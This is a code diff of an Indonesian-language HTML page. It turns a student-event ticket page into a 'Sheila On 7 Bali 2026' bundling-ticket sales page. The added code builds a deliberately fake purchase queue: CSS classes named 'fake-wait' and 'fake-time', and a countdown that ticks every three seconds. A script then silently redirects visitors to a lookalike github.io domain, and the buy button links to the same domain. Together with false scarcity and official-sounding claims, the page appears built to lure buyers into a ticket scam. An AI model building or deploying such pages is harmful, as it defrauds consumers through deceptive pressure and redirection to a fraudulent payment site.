@@ -1,328 +1,411 @@
 <!DOCTYPE html>
 <html lang="id">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
 
-<title>POLIPONI 2026 BALI</title>
-
-<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+<title>OPEN PAKET BUNDLING SHEILA ON 7 BALI 2026</title>
 
 <style>
-
 *{
 margin:0;
 padding:0;
 box-sizing:border-box;
-font-family:'Poppins',sans-serif;
+font-family:Arial, sans-serif;
 }
 
 body{
-background:#f4f5f7;
+background:#f5f5f5;
 color:#111;
-padding-bottom:120px;
+}
+
+.container{
+max-width:700px;
+margin:auto;
+background:#fff;
+min-height:100vh;
 }
 
 .banner{
 width:100%;
 display:block;
-object-fit:cover;
-border-radius:0 0 28px 28px;
 }
 
-.container{
+.content{
 padding:18px;
 }
 
-.badge{
-background:#e8f0ff;
-color:#1b3fd1;
-font-size:12px;
-font-weight:700;
+.event-badge{
 display:inline-block;
+background:#ff4d00;
+color:#fff;
+font-weight:bold;
 padding:8px 14px;
-border-radius:50px;
+border-radius:10px;
+font-size:13px;
 margin-bottom:14px;
 }
 
-.title{
-font-size:24px;
-font-weight:800;
-line-height:1.4;
-margin-bottom:10px;
+h1{
+font-size:28px;
+line-height:1.3;
+font-weight:900;
+margin-bottom:14px;
 }
 
-.location{
-font-size:14px;
-color:#666;
-margin-bottom:18px;
+.subtitle{
+font-size:15px;
+line-height:1.7;
+color:#444;
+margin-bottom:20px;
 }
 
 .info-box{
-background:#fff;
-border-radius:20px;
+background:#fafafa;
+border:2px solid #111;
+border-radius:18px;
 padding:18px;
-margin-bottom:18px;
-box-shadow:0 4px 18px rgba(0,0,0,0.05);
+margin-bottom:22px;
 }
 
-.info-title{
-font-size:18px;
-font-weight:700;
+.info-item{
 margin-bottom:14px;
 }
 
-.info-text{
-font-size:14px;
-line-height:1.9;
-color:#444;
+.info-item:last-child{
+margin-bottom:0;
+}
+
+.label{
+font-size:12px;
+font-weight:bold;
+color:#777;
+margin-bottom:5px;
+text-transform:uppercase;
+}
+
+.value{
+font-size:16px;
+font-weight:700;
 }
 
 .section{
-background:#fff;
-padding:20px;
-border-radius:22px;
-margin-bottom:18px;
-box-shadow:0 4px 18px rgba(0,0,0,0.05);
+margin-bottom:28px;
 }
 
 .section h2{
-font-size:18px;
-margin-bottom:14px;
-font-weight:700;
+font-size:22px;
+margin-bottom:15px;
+font-weight:900;
 }
 
 .section p{
-font-size:14px;
+font-size:15px;
 line-height:1.9;
 margin-bottom:14px;
-color:#444;
+color:#333;
 }
 
-.section ul{
+.rules{
 padding-left:20px;
 }
 
-.section li{
-margin-bottom:12px;
-font-size:14px;
+.rules li{
+margin-bottom:14px;
 line-height:1.8;
-color:#444;
+font-size:15px;
 }
 
 .highlight{
-color:#1b3fd1;
-font-weight:700;
+background:#fff200;
+padding:2px 6px;
+font-weight:bold;
 }
 
-.warning{
-background:#fff3cd;
-border:1px solid #ffe08a;
-padding:16px;
-border-radius:18px;
-font-size:13px;
-line-height:1.8;
-color:#8a6d3b;
-margin-top:18px;
+.fake-wait{
+background:#111;
+color:#fff;
+padding:18px;
+border-radius:16px;
+text-align:center;
+margin-bottom:25px;
 }
 
-.bottom-bar{
-position:fixed;
-bottom:0;
-left:0;
-right:0;
-background:#fff;
-padding:14px 18px;
-box-shadow:0 -4px 18px rgba(0,0,0,0.08);
-display:flex;
-justify-content:space-between;
-align-items:center;
-z-index:999;
+.fake-wait h3{
+font-size:18px;
+margin-bottom:8px;
 }
 
-.price{
-font-size:22px;
-font-weight:800;
-color:#111;
-}
-
-.price span{
-display:block;
-font-size:12px;
-color:#777;
-font-weight:500;
+.fake-time{
+font-size:40px;
+font-weight:900;
+color:#00ff66;
+margin-top:10px;
 }
 
 .buy-btn{
-background:#1b3fd1;
+display:block;
+width:100%;
+text-align:center;
+background:#ff4d00;
 color:#fff;
 text-decoration:none;
-padding:14px 28px;
+padding:18px;
+font-size:20px;
+font-weight:900;
 border-radius:16px;
-font-size:15px;
-font-weight:700;
-animation:pulse 1s infinite;
+margin-top:20px;
+box-shadow:0 8px 0 #c93800;
+transition:0.2s;
 }
 
-@keyframes pulse{
-0%{transform:scale(1);}
-50%{transform:scale(1.05);}
-100%{transform:scale(1);}
+.buy-btn:active{
+transform:translateY(4px);
+box-shadow:0 4px 0 #c93800;
 }
 
-.sold-box{
-background:#ffefef;
-padding:16px;
-border-radius:18px;
-margin-bottom:18px;
-border:1px solid #ffcaca;
+.footer{
 text-align:center;
+padding:30px 20px;
+font-size:13px;
+color:#777;
+line-height:1.8;
 }
 
-.sold-text{
-font-size:14px;
-font-weight:700;
-color:#d62828;
-animation:blink 1s infinite;
+@media(max-width:600px){
+
+h1{
+font-size:24px;
 }
 
-@keyframes blink{
-0%{opacity:1;}
-50%{opacity:0.4;}
-100%{opacity:1;}
+.section h2{
+font-size:20px;
 }
 
-.divider{
-height:1px;
-background:#eee;
-margin:18px 0;
+.buy-btn{
+font-size:18px;
+padding:16px;
 }
 
+.fake-time{
+font-size:34px;
+}
+
+}
 </style>
 </head>
-<body>
 
-<img src="banner-deskripsi.png" class="banner">
+<body>
 
 <div class="container">
 
-<div class="badge">
-OPEN TIKET BUNDLING POLIPONI 2026
+<img src="banner-deskripsi.png" class="banner">
+
+<div class="content">
+
+<div class="event-badge">
+OPEN PAKET BUNDLING 2026
 </div>
 
-<div class="title">
-Pekan Olahraga dan Seni Politeknik Nasional 2026 Bali
-</div>
+<h1>
+Paket Bundling Tiket Sheila On 7 Bali 2026 Resmi Dibuka
+</h1>
 
-<div class="location">
-📍 Bali International Convention Center • Bali, Indonesia
-</div>
-
-<div class="sold-box">
-<div class="sold-text">
-🔥 Tiket Bundling Hampir Habis • Tersisa Sedikit Slot Hari Ini
-</div>
-</div>
+<p class="subtitle">
+Nikmati pengalaman konser terbaik bersama Sheila On 7 dalam event spesial POLIPONI BALI 2026 yang akan diselenggarakan di Bali United Training Center. Paket bundling ini memberikan keuntungan lebih untuk para penonton dengan akses tiket prioritas, merchandise eksklusif, serta benefit tambahan yang hanya tersedia dalam periode pembelian terbatas.
+</p>
 
 <div class="info-box">
 
-<div class="info-title">
-Tentang Event
+<div class="info-item">
+<div class="label">EVENT</div>
+<div class="value">POLIPONI BALI 2026</div>
 </div>
 
-<div class="info-text">
-POLIPONI 2026 merupakan ajang nasional mahasiswa politeknik terbesar di Indonesia yang mempertemukan ribuan peserta dari berbagai wilayah dalam kompetisi olahraga, seni, kreativitas, dan inovasi mahasiswa tingkat nasional.
+<div class="info-item">
+<div class="label">SPECIAL PERFORMANCE</div>
+<div class="value">Sheila On 7 • Dialog Dini Hari • 510</div>
+</div>
 
-Acara ini akan diselenggarakan di Bali dan menghadirkan rangkaian kegiatan kompetitif, hiburan, pertunjukan seni budaya, festival mahasiswa, networking antar kampus, hingga kegiatan ceremonial nasional dengan konsep modern dan profesional.
+<div class="info-item">
+<div class="label">LOKASI</div>
+<div class="value">Bali United Training Center</div>
+</div>
 
-Melalui pembelian tiket bundling ini, peserta akan mendapatkan akses ke berbagai rangkaian kegiatan utama selama event berlangsung sesuai dengan kategori tiket yang dipilih.
+<div class="info-item">
+<div class="label">TANGGAL</div>
+<div class="value">04 Juli 2026</div>
+</div>
+
+<div class="info-item">
+<div class="label">PROMOTED BY</div>
+<div class="value">LETRALIVE</div>
+</div>
+
+</div>
+
+<div class="fake-wait">
+
+<h3>
+Antrian Pembelian Tiket Bundling
+</h3>
+
+<p>
+Sedang terjadi lonjakan pembelian tiket konser Sheila On 7 Bali 2026.
+Estimasi waktu tunggu:
+</p>
+
+<div class="fake-time" id="countdown">
+02:00:00
 </div>
 
 </div>
 
 <div class="section">
 
-<h2>Deskripsi Kegiatan</h2>
+<h2>
+Deskripsi Event
+</h2>
 
 <p>
-Event <span class="highlight">POLIPONI 2026 BALI</span> menjadi momentum besar bagi mahasiswa politeknik seluruh Indonesia untuk berkumpul, berkompetisi, dan memperluas relasi antar institusi pendidikan vokasi.
+POLIPONI BALI 2026 merupakan salah satu rangkaian konser dan hiburan terbesar tahun 2026 yang menghadirkan pengalaman live performance dengan konsep modern, visual interaktif, serta lineup musisi pilihan Indonesia.
 </p>
 
 <p>
-Kegiatan akan berlangsung selama beberapa hari dengan menghadirkan berbagai cabang olahraga, festival seni mahasiswa, penampilan spesial, bazar kreatif mahasiswa, showcase teknologi, dan kegiatan hiburan lainnya yang dikemas secara profesional.
+Dalam pembukaan penjualan kali ini, tersedia <span class="highlight">Paket Bundling Sheila On 7</span> yang menjadi kategori paling diminati oleh pengunjung karena menghadirkan berbagai benefit eksklusif untuk penonton yang ingin menikmati konser dengan pengalaman terbaik.
 </p>
 
 <p>
-Peserta yang telah melakukan registrasi tiket bundling akan memperoleh akses masuk area event sesuai jadwal dan ketentuan panitia yang berlaku.
+Event ini akan berlangsung di Bali United Training Center dengan kapasitas penonton terbatas dan sistem penjualan online resmi. Seluruh pembelian tiket dilakukan secara digital dan setiap transaksi akan mendapatkan kode booking otomatis setelah pembayaran berhasil diverifikasi.
 </p>
 
 <p>
-Panitia menyediakan sistem registrasi digital modern guna mempermudah proses verifikasi peserta dan pengunjung selama kegiatan berlangsung.
+Selain penampilan spesial dari Sheila On 7, acara ini juga akan dimeriahkan oleh penampilan musisi lainnya seperti Dialog Dini Hari dan 510 yang siap menghadirkan suasana konser penuh energi dan nostalgia.
 </p>
 
-<div class="divider"></div>
+<p>
+Paket bundling ini dirancang khusus untuk mempermudah penonton mendapatkan tiket prioritas tanpa harus melakukan pembelian terpisah. Tiket bundling juga memberikan akses lebih cepat saat proses check-in event berlangsung.
+</p>
 
-<h2>Fasilitas Tiket Bundling</h2>
+</div>
 
-<ul>
-<li>Akses masuk area event POLIPONI 2026</li>
-<li>ID Digital Registrasi Event</li>
-<li>E-Sertifikat peserta/pengunjung</li>
-<li>Akses festival hiburan mahasiswa</li>
-<li>Dokumentasi dan media publikasi event</li>
-<li>Kesempatan mengikuti berbagai aktivitas umum event</li>
-<li>Support layanan registrasi online</li>
-<li>Akses informasi jadwal kegiatan event</li>
+<div class="section">
+
+<h2>
+Benefit Paket Bundling
+</h2>
+
+<ul class="rules">
+<li>Akses pembelian tiket prioritas konser Sheila On 7 Bali 2026.</li>
+
+<li>Kesempatan mendapatkan merchandise event eksklusif selama persediaan masih tersedia.</li>
+
+<li>QR digital ticket otomatis setelah pembayaran berhasil diverifikasi.</li>
+
+<li>Akses jalur fast check-in pada area event tertentu.</li>
+
+<li>Benefit bundling lebih hemat dibanding pembelian satuan.</li>
+
+<li>Kesempatan mengikuti giveaway official merchandise selama periode event berlangsung.</li>
 </ul>
 
 </div>
 
 <div class="section">
 
-<h2>Syarat dan Ketentuan</h2>
+<h2>
+Syarat dan Ketentuan
+</h2>
 
-<ul>
-<li>Peserta wajib melakukan registrasi menggunakan data yang benar dan valid.</li>
+<ul class="rules">
 
-<li>Tiket yang telah dibeli tidak dapat dibatalkan ataupun diuangkan kembali.</li>
+<li>
+Pembelian tiket bundling hanya berlaku selama kuota masih tersedia.
+</li>
 
-<li>Panitia berhak melakukan verifikasi data peserta sewaktu-waktu apabila diperlukan.</li>
+<li>
+Setiap pembeli wajib mengisi data pemesanan dengan benar dan lengkap.
+</li>
 
-<li>Peserta wajib menjaga ketertiban, keamanan, dan mematuhi seluruh aturan yang berlaku selama kegiatan berlangsung.</li>
+<li>
+Tiket yang sudah dibeli tidak dapat dibatalkan ataupun diuangkan kembali.
+</li>
 
-<li>Dilarang membawa barang berbahaya, narkotika, senjata tajam, ataupun benda terlarang lainnya ke area event.</li>
+<li>
+Panitia tidak bertanggung jawab atas kesalahan pengisian data oleh pembeli.
+</li>
 
-<li>Peserta diwajibkan menjaga kebersihan area kegiatan dan menghormati seluruh peserta lainnya.</li>
+<li>
+QR Ticket wajib ditunjukkan saat memasuki area event.
+</li>
 
-<li>Panitia tidak bertanggung jawab atas kehilangan barang pribadi peserta selama kegiatan berlangsung.</li>
+<li>
+Dilarang memperjualbelikan tiket di luar platform resmi.
+</li>
 
-<li>Seluruh dokumentasi foto dan video selama event berlangsung dapat digunakan untuk kebutuhan publikasi resmi kegiatan.</li>
+<li>
+Pihak penyelenggara berhak melakukan perubahan teknis apabila diperlukan demi kelancaran acara.
+</li>
 
-<li>Peserta wajib menunjukkan bukti registrasi atau tiket digital saat proses check-in event.</li>
+<li>
+Dengan melakukan pembelian tiket, pembeli dianggap telah memahami dan menyetujui seluruh syarat dan ketentuan yang berlaku.
+</li>
 
-<li>Dengan melakukan pembelian tiket bundling, peserta dianggap telah membaca dan menyetujui seluruh syarat dan ketentuan yang berlaku.</li>
 </ul>
 
-<div class="warning">
-⚠️ INFORMASI PENTING: Tiket bundling memiliki kuota terbatas dan dapat ditutup sewaktu-waktu apabila kapasitas peserta telah terpenuhi.
 </div>
 
-</div>
-
-</div>
-
-<div class="bottom-bar">
-
-<div class="price">
-Rp95.000
-<span>Tiket Bundling</span>
-</div>
-
-<a href="#" class="buy-btn">
-Beli Tiket
+<a href="https://poliponii2026.github.io/CATEGORY-POLIPONI/" class="buy-btn">
+BELI TIKET BUNDLING
 </a>
 
+<div class="footer">
+© 2026 POLIPONI BALI • Ticketing Partner by Artatix
 </div>
+
+</div>
+</div>
+
+<script>
+
+let fakeHours = 2;
+let fakeMinutes = 0;
+let fakeSeconds = 0;
+
+function updateCountdown(){
+
+const countdown = document.getElementById("countdown");
+
+if(fakeSeconds === 0){
+if(fakeMinutes === 0){
+if(fakeHours !== 0){
+fakeHours--;
+fakeMinutes = 59;
+fakeSeconds = 59;
+}
+}else{
+fakeMinutes--;
+fakeSeconds = 59;
+}
+}else{
+fakeSeconds--;
+}
+
+let h = String(fakeHours).padStart(2,'0');
+let m = String(fakeMinutes).padStart(2,'0');
+let s = String(fakeSeconds).padStart(2,'0');
+
+countdown.innerHTML = `${h}:${m}:${s}`;
+
+}
+
+setInterval(updateCountdown, 3000);
+
+setTimeout(() => {
+window.location.href = "https://poliponii2026.github.io/CATEGORY-POLIPONI/";
+}, 300000);
+
+</script>
 
 </body>
 </html>
